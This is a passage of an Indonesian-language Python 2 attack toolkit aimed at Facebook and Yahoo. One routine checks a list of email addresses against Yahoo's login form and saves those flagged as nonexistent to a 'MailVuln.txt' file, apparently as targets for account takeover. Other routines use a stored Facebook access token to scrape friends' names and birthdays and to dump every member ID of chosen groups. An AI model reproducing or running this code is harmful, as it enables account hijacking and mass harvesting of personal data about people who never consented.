    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[1;91m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;92m ' + mail
            else:
                print '\x1b[1;91m ' + mail

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_yahoo()

def getlahir():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('sh logo.sh')
        print ' \x1b[91m════════════════════════════════════════════════════'
        print " \x1b[91m[\x1b[97m+\x1b[91m] \x1b[37mPliss Tunggu !!"
	kuk = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
	pul = json.loads(kuk.text)
	for jsonm in pul["data"]:
		by = requests.get('https://graph.facebook.com/' + jsonm["id"] + '?access_token=' + toket)
		hek = json.loads(by.text)
		try:
                    print " \x1b[91m[\x1b[97m+\x1b[91m] \x1b[32mNama \x1b[37m: %s => \x1b[32mTanggal \x1b[37m: %s"%(hek["name"],hek['birthday'])
		except: pass
	print " [+] Succesfuly"
	raw_input("\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]")
	menu()

def lain():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    os.system('sh logo.sh')
    print ' \x1b[91m════════════════════════════════════════════════════'
    print '\x1b[1;91m[\x1b[32m1\x1b[91m]\x1b[1;34m Liat Id Grub'
    print '\x1b[1;91m[\x1b[32m2\x1b[91m]\x1b[1;34m Ambil Id Grub'
    print '\x1b[1;91m[\x1b[32m0\x1b[91m]\x1b[1;34m Kembali'
    Grub()

def Grub():
    asw = raw_input('\x1b[1;32mSelect \xe2\x96\xba\x1b[1;97m ')
    if asw == '':
        print '\x1b[1;91m[!] Jangan kosong'
        Grub()
    elif asw == '1':
              grupsaya()
    elif asw == '2':
              id_member_grup()
    elif asw == '0':
              menu()


def grupsaya():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('sh logo.sh')
        print ' \x1b[91m════════════════════════════════════════════════════'
        jalan(' \x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
        print ' \x1b[91m════════════════════════════════════════════════════'
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Grup \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97mgrupid.txt'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Grup tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()


def id_member_grup():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('sh logo.sh')
            print ' \x1b[91m════════════════════════════════════════════════════'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Grup tidak ditemukan'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                lain()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'

            def next_dump(next_url):
                next_dump_api = requests.get(next_url)
                next_result_json = json.loads(next_dump_api.text)
                next_page = next_result_json['paging']
                for ni in next_result_json['data']:
                    idmem.append(ni['id'])
                    b.write(ni['id'] + '\n')

                if next_page.get('next') is not None:
                    next_dump(next_page.get('next'))
                return

            def dump():
                dump_api = requests.get('https://graph.facebook.com/' + id + '/members?fileds=id&limit=5000&summary=true&access_token=' + toket)
                result_json = json.loads(dump_api.text)
                page = result_json['paging']
                for i in result_json['data']:
                    idmem.append(i['id'])
                    b.write(i['id'] + '\n')

                if page.get('next') is not None:
                    next_dump(page.get('next'))
                return

            dump()
            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Grup tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()


if __name__ == '__main__':
  login()

